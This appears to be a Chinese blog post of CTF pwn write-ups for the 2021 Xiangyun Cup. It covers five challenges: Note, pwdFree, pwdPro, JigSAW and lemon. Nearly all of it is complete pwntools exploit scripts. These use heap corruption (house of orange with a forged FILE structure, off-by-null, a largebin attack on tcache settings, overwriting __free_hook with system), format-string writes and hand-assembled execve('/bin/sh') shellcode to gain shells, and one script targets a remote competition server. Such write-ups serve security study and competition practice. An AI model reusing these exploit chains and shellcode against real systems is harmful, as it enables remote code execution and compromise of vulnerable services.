---
title: 祥云杯pwn
date: 2021-09-02 18:58:58
tags:
---
## Note

> 由于没有free就按着house_of_orange那一套打的

```python
#!/usr/bin/env python
from pwn import *

re = 1
context.log_level = "debug"
if re:
	p = remote("47.104.70.90", "25315")
	libc = ELF("./libc-2.23.so")
else:
	binary = "./note"
	p = process(binary)
	lib = "/lib/x86_64-linux-gnu/libc-2.23.so"
	elf = ELF(binary)
	libc = ELF(lib)

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
def file1():
	file= "/bin/sh\x00"                        #_flags
	file+=p64(0x61)                       #_IO_read_ptr
	file+=p64(0)                       #_IO_read_end
	file+=p64(0)                       #_IO_read_base
	file+=p64(0)                       #_IO_write_base
	file+=p64(1)                       #_IO_write_ptr
	file+=p64(0)                       #_IO_write_end
	file+=p64(0)                       #_IO_buf_base
	file+=p64(0)                       #_IO_buf_end
	file+=p64(0)                       #_IO_save_base
	file+=p64(0)                       #_IO_backup_base
	file+=p64(0)                       #_IO_save_end
	file+=p64(0)                       #_markers
	file+=p64(0)                       #chain   could be a anathor file struct
	file+=p32(0)                       #_fileno
	file+=p32(0)                       #_flags2
	file+=p64(0)                       #_old_offset
	file+=p16(0)                       #_cur_column
	file+=p8(0)                        #_vtable_offset
	file+=p8(0)                        #_shortbuf[0]
	file+=p32(0)                       #_shortbuf[1]
	file+=p64(0)                       #_lock
	file+=p64(0)                       #_offset
	file+=p64(0)                       #_codecvt
	file+=p64(0)                       #_wide_data
	file+=p64(0)                       #_freeres_list
	file+=p64(0)                       #_freeres_buf
	file+=p64(0)                       #__pad5
	file+=p32(0)                       #_mode
	file+=p32(0)                       #unused2
	file+=p64(0)*2                     #unused2
	file+=p64(ptr+0x202c8)         #vtable
	file+=p64(libc.sym["system"])
	return file  
def add(size,content):
	ru("choice: ")
	sl("1")
	ru("size: ")
	sl(str(size))
	ru("content: ")
	sl(content)
	ru("addr: ")
	return int(r(len("0x55a022cd7010")),16)
def say(Format,content):
	ru("choice: ")
	sl("2")
	ru("say ? ")
	sl(Format)
	ru("? ")
	sl(content)
def show():
	ru("choice: ")
	sl("3")	

for _ in range(0xf):
	add(0xf8,"A"*8)
ptr = add(0x48,"A"*0x48)
say("%7$d".ljust(8,"\x00")+p64(ptr+0x48),str(0xb1))
add(0xf8,"A"*0x8)
t = add(0x18,"A"*7)
show()
raw_input()
malloc_hook = u64(ru("\x7f")[-6:]+"\x00\x00")-216-0x10
info("malloc_hook => 0x%x"%malloc_hook)



libc.address = malloc_hook - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)

ptr = add(0xf8,file1())
say("%7$p".ljust(8,"\x00")+p64(t+0x18),hex(0))
say("%7$p".ljust(8,"\x00")+p64(libc.sym["_IO_2_1_stderr_"]+0x68),hex(ptr))

r()
sl("1")
ru("size: ")
sl("11")
info(hex(ptr))
sh()
```
实际这种方法也挺傻的攻击stdout,stdin更方便。
还有攻击exit_hook的方法

## pwdFree

> glibc2.27的off_by_null
```python
#!/usr/bin/env python
from pwn import *

binary = "./pwdFree"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(binary)
# p = remote("node4.buuoj.cn","25182")
elf = ELF(binary)
libc = ELF(lib)
# context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sla = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
trs = lambda src    :src^middle

def add(ID,size,content):
	sla("Choice:","1")
	sla("Input The ID You Want Save:",ID)
	sla("Length Of Your Pwd:",str(size))
	sla("Your Pwd:",content)
def show(id):
	sla("Choice:","3")
	sla("Check:",str(id))

def free(id):
	sla("Choice:","4")
	sla("Delete:",str(id))

add("0",0xf8,"A")             #0
ru("Save ID:")
r(8)
middle = u64(r(8))
print("middle => 0x%x"%middle)
add("1",0xf8,"B")             #1
add("2",0xf8,"C")             #2
add("3",0xf8,"D")             #3
add("4",0xf8,"E")             #4
add("5",0xf8,"F")             #5
add("6",0xf8,"F")             #6

add("7",0xf8,"F")             #7
add("8",0x18,"F")             #8
add("9",0x18,"F")             #9
add("10",0xf8,"F")             #9
add("11",0x18,"F")             #10
add("barrier2",0x18,"F")             #barrier

for _ in range(7):
	free(str(_))

free(7)

free(9)
payload = ""
payload += p64(trs(0))*(2)
payload += p64(trs(0x20+0x100+0x20))
add("leak",0x18,payload)      #8
free(10)

add("giles",0x78,"1") 
add("giles",0x78,"1") 

show(8)
ru("Pwd is: ")
malloc_hook = trs(u64(r(8)))-96-0x10
info("malloc_hook => 0x%x"%malloc_hook)
libc.address = malloc_hook - libc.sym["__malloc_hook"]

free(11)
free(0)

payload = ''
payload += p64(trs(0))*3
payload += p64(trs(0x21))
payload += p64(trs(libc.sym["__free_hook"]-8))
add("Giles",0x30,payload)
add("Giles",0x18,"a")
payload = ""
payload += p64(trs(0x68732f6e69622f))
payload += p64(trs(libc.sym["system"]))
payload += p64(trs(0))
add("Giles",0x18,payload)

sl("4")
sl("4")
r()

sh()
```
off_by_null 源码分析请移步
## pwdPro

> glibc2.31通过largebin attack攻击mp.tcache_bins

```python
#!/usr/bin/env python
from pwn import *

binary = "./pwdPro"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(binary)
elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sla = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
choice = lambda n: p.sendlineafter("Input Your Choice:\n",str(n))
trs = lambda what: what^random

def add(id,size,content):
	choice(1)
	ru("Which PwdBox You Want Add:\n")
	sl(str(id))
	ru("Input The ID You Want Save:")
	sl("cat03")
	ru("Length Of Your Pwd:")
	sl(str(size))
	ru("Your Pwd:")
	sl(content)
def edit(id,content):
	choice(2)
	sla("Which PwdBox You Want Edit:\n",str(id))
	sl(content)
def show(id):
	choice(3)
	sla("Which PwdBox You Want Check:\n",str(id))
def free(id):
	choice(4)
	sla("Idx you want 2 Delete:\n",str(id))
def recover(id):
	choice(5)
	sla("Idx you want 2 Recover:\n",str(id))



add(0,0x500,"AAAA")
ru("Save ID:")
r(8)
r(8)
r(8)
r(8)
random = u64(r(8))
info("random => 0x%x"%random)
add(1,0x500,"BBBB")
add(2,0x500,"CCCC")
free(1)
recover(1)
show(1)
ru("Pwd is: ")
malloc_hook = trs(u64(r(8)))-96-0x10
libc.address = malloc_hook - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)
add(4,0x600,"EEEE")
show(1)
ru("Pwd is: ")
r(16)
heap = trs(u64(r(8)))-0x7a0
info("heap => 0x%x"%heap)
add(4,0x500,"EEEE")


add(1,0x510,"BBBB")
add(2,0x500,"CCCC")

add(3,0x500,"CCCC")
add(4,0x500,"CCCC")
free(1)
add(5,0x600,"CCCC")
free(3)
recover(1)
payload = ""
payload += p64(libc.address+0x1ec010)
payload += p64(libc.address+0x1ec010)
payload += p64(heap+0x17d0)
payload += p64(libc.address+0x1eb2d0-4*0x8)
edit(1,payload)
add(5,0x600,"CCCC")

free(5)
payload = ""
payload += '\x00'*0xe8
payload += p64(libc.sym["__free_hook"]-8)
edit(0,payload)
payload = ""
payload += p64(trs(0x68732f6e69622f))
payload += p64(trs(libc.sym["system"]))
add(5,0x600,payload)
free(5)
sh()

```
源码分析移步
## JidSAW

> 宽度溢出+shellcode

```python
#!/usr/bin/env python
from pwn import *

binary = "./JigSAW"
lib = "./libc.so"
p = process(binary)
elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

def welcome():
	ru("Name:\n")
	raw_input()
	sl("cat03")
	ru("Choice:\n")
	sl(str(0xf00000000))
def add(id):
	ru("Choice : ")
	sl("1")
	ru("Index? : ")
	sl(str(id))
def edit(id,content):
	ru("Choice : ")
	sl("2")
	ru("Index? : ")
	sl(str(id))
	ru("iNput:")
	sl(content)
def free(id):
	ru("Choice : ")
	sl("3")
	ru("Index? : ")
	sl(str(id))
def test(id):
	ru("Choice : ")
	sl("4")
	ru("Index? : ")
	sl(str(id))

shell1 = '''
mov rdi,0x68732f6e69622f
push rdi
jmp $+21
'''
shell2 = '''
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
xor rax,rax
jmp $+20
'''
shell3 = '''
mov al,0x3b
syscall
'''
# shell1 = asm(shell1,arch = "amd64")
# shell2 = asm(shell2,arch = "amd64")
# shell3 = asm(shell3,arch = "amd64")
# print("".join("\\x%02x"%ord(_) for _ in shell3))

shell1 = "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\xeb\x13"
shell2 = "\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xeb\x12"
shell3 = "\xb0\x3b\x0f\x05"

welcome()
add(0)
add(1)
add(2)
edit(0,shell1)
edit(1,shell2)
edit(2,shell3)
raw_input()
test(0)

sh()
```

## lemon

觉得改argv[0]报错做法 比较狗
```python
#!/usr/bin/env python
from pwn import *
from random import randint

binary = "./lemon"
lib = "/home/giles/tools/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so"

elf = ELF(binary)
libc = ELF(lib)

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

def welcome():
	ru("me?\n")
	sl("yes")
	ru("number: \n")
	s(p64(0xcff48db8b7c913e7))
	ru("name first: \n")
	s("cat03".ljust(0x10,"A")+p32(0x200)+"\x01")
	ru("your reward is ")
	return ru("\n")
def welcome2():
	ru("me?\n")
	sl("no")
def add(id,name,size,content):
	sal("choice >>> ","1")
	sal("index of your lemon: \n",str(id))
	sa("name your lemon: \n",name)
	sal("Input the length of message for you lemon: \n",str(size))
	sa("message: \n",content)
def add2(id,name,size=0x400+1):
	sal("choice >>> ","1")
	sal("index of your lemon: \n",str(id))
	sa("name your lemon: \n",name)
	sal("Input the length of message for you lemon: \n",str(size))

def show(id):
	sal("choice >>> ","2")
	sal("Input the index of your lemon : ",str(id))
	ru("eat eat eat ")
	return ru("\n")
def free(id):
	sal("choice >>> ","3")
	sal("Input the index of your lemon : ",str(id))
def edit(id,content):
	sal("choice >>> ","4")
	sal("Input the index of your lemon  : \n",str(id))
	sa("Now it's your time to draw and color!\n",content)
def exp():
	context.log_level = "debug"
	stack = int(welcome(),16)-0x40 + (randint(0x0,0xf)<<0xc)

	info("stack => 0x%x"%stack)
	first = stack&0xff
	second = stack>>8
	info("first => 0x%x"%first)
	info("second => 0x%x"%second)
	# raw_input()
	edit(-260,"A"*0x138+chr(first)+chr(second))


	add(1,"cat03",0x28,"AAA")
	add2(0,"cat03")
	free(0)
	free(1)
	add(1,"cat03",0x28,"AAA")
	payload = ""
	payload += p64(0)
	payload += p64(0x241)
	add(0,"\x00\xf3",0x248,payload)
	add(0,"giles",0x18,"aaa")
	# raw_input()
	add2(0,"cat03")

# p = process("./lemon")
# exp()	

while True:
	p = process(binary)
	try:
		exp()
		result = r()
		if "flag" in result:
			raw_input("flag")
	except:
		p.close()
		continue


sh()
```